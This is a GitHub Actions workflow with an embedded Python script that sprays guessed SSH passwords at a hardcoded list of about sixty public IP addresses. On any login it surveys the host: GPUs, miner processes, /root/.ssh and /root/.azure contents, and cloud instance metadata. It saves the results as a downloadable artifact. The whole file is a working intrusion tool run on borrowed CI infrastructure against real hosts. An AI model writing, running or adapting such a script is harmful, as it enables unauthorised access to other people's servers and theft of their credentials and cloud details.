name: sweep5
on:
  workflow_dispatch:
    inputs:
      cycles: {description: 'cycles', required: false, default: '100'}
jobs:
  s:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - name: go
        env:
          IPS: "134.149.42.155 134.149.59.33 135.116.19.243 135.116.84.27 135.225.79.249 168.62.216.152 172.174.31.97 172.213.25.163 20.109.152.114 20.109.162.87 20.114.255.207 20.115.147.1 20.118.131.83 20.125.42.21 20.125.49.91 20.125.99.42 20.205.187.223 20.216.40.163 20.223.198.42 20.225.239.178 20.234.97.205 20.237.207.128 20.240.130.208 20.240.141.10 20.240.55.118 20.245.108.11 20.50.113.151 20.59.127.108 20.74.153.201 20.74.241.13 20.74.242.85 20.91.207.55 20.97.252.251 23.100.38.120 4.155.130.93 4.193.185.193 4.194.2.30 4.204.241.108 4.210.119.224 4.246.80.6 40.113.1.63 40.123.206.138 40.70.241.0 40.70.247.98 48.193.46.184 48.193.47.3 51.104.16.184 52.236.59.223 57.154.50.93 57.174.238.72 70.153.141.118 70.153.142.83 70.153.148.119 70.153.149.34 70.153.18.193 70.153.87.133 74.162.158.9 74.234.69.82 98.71.78.150"
          CYCLES: ${{ github.event.inputs.cycles }}
        run: |
          python3 -m pip install --quiet paramiko
          echo "EGRESS $(curl -s -m 8 https://ifconfig.me || true)"
          cat > sw.py <<'PYEOF'
          import os, socket, time, threading
          import paramiko
          from concurrent.futures import ThreadPoolExecutor
          IPS=os.environ["IPS"].split(); CYCLES=int(os.environ.get("CYCLES","100"))
          PWS=["t19","T19","Azcfy@2026","Minio@2024","H100@azure2026","T19@azure2026","Azadm1n!2026","InfiniBand1!","Prl@2026!","Ulplant@2026"]
          def lg(m):
              print(m, flush=True)
          budget={"n":60}; lock=threading.Lock(); tried={}
          def banner(ip,port=22,t=3):
              try:
                  s=socket.create_connection((ip,port),timeout=t); s.settimeout(t)
                  b=s.recv(255); s.close(); return b.decode(errors='replace').strip()
              except Exception:
                  return None
          def kbd(ip,user,pw):
              with lock:
                  if budget["n"]<=0: return None
                  budget["n"]-=1
              try:
                  c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  c.connect(ip,22,username=user,passphrase=None,timeout=7,banner_timeout=7,auth_timeout=7,
                            allow_agent=False,look_for_keys=False,
                            password=None,
                            disabled_algorithms=None,
                            )
                  return None
              except Exception:
                  return None
          def kbd2(ip,user,pw):
              with lock:
                  if budget["n"]<=0: return None
                  budget["n"]-=1
              try:
                  tr=paramiko.Transport((ip,22)); tr.start_client(timeout=7)
                  try:
                      tr.auth_interactive_dumb(user, lambda t,a,p: [pw]*len(p))
                  except paramiko.AuthenticationException:
                      tr.close(); return None
                  except Exception as e:
                      tr.close(); lg("KBDERR %s %s %s"%(ip,user,str(e)[:60])); return None
                  return tr
              except Exception as e:
                  lg("KBDCONN %s %s"%(ip,str(e)[:50])); return None
          def run_cmd(tr,cmd):
              ch=tr.open_session(); ch.exec_command(cmd); out=ch.makefile('rb').read().decode(errors='replace'); ch.close(); return out
          def census(tr,ip):
              cmds=["id","hostname -I; cat /etc/hostname","head -2 /proc/1/cgroup","nvidia-smi -L",
                    "nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv",
                    "ps -eo pid,etimes,args | grep -Ei 'pearl|wildrig|miner|krig' | grep -v grep | head -6",
                    "ls -la /opt/t19 /root/.ssh /root/.azure /etc/ul 2>/dev/null | head -20",
                    "curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json' | head -c 800"]
              out=[]
              for cmd in cmds:
                  try: out.append("$ "+cmd+"\n"+run_cmd(tr,cmd))
                  except Exception as ex: out.append("$ "+cmd+"\nERR "+str(ex)[:60])
              return "\n".join(out)
          def handle(ip,bn):
              lg("PORT_OPEN %s %r"%(ip,bn))
              if ip in tried: return
              tried[ip]=True
              for u in ["t19","ubuntu","root"]:
                  for pw in PWS:
                      with lock:
                          if budget["n"]<=0: return
                      tr=kbd2(ip,u,pw)
                      if tr:
                          lg("AUTH_OK KBDINT %s user=%s pw=%s"%(ip,u,pw))
                          body=census(tr,ip); lg("CENSUS %s\n%s"%(ip,body))
                          open("/tmp/AUTH_%s.txt"%ip,"w").write(body); return
                      lg("KBD_FAIL %s user=%s pw=%s"%(ip,u,pw))
          def probe(ip):
              b=banner(ip)
              return (ip,b) if (b and b.startswith("SSH-")) else None
          openh={}
          for cyc in range(CYCLES):
              with ThreadPoolExecutor(max_workers=48) as ex:
                  for r in ex.map(probe, IPS):
                      if r:
                          if r[0] not in openh: lg("BANNER %s %r"%(r[0],r[1]))
                          openh[r[0]]=r[1]
              lg("== CYCLE %d %s open=%d budget=%d"%(cyc,time.strftime("%H:%M:%SZ",time.gmtime()),len(openh),budget["n"]))
              for ip in list(openh):
                  if budget["n"]<=0: break
                  handle(ip,openh[ip])
              if budget["n"]<=0: break
              time.sleep(4)
          lg("SUMMARY open=%d %s"%(len(openh),list(openh)))
          PYEOF
          python3 sw.py
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: out
          path: /tmp/AUTH_*.txt
          if-no-files-found: warn
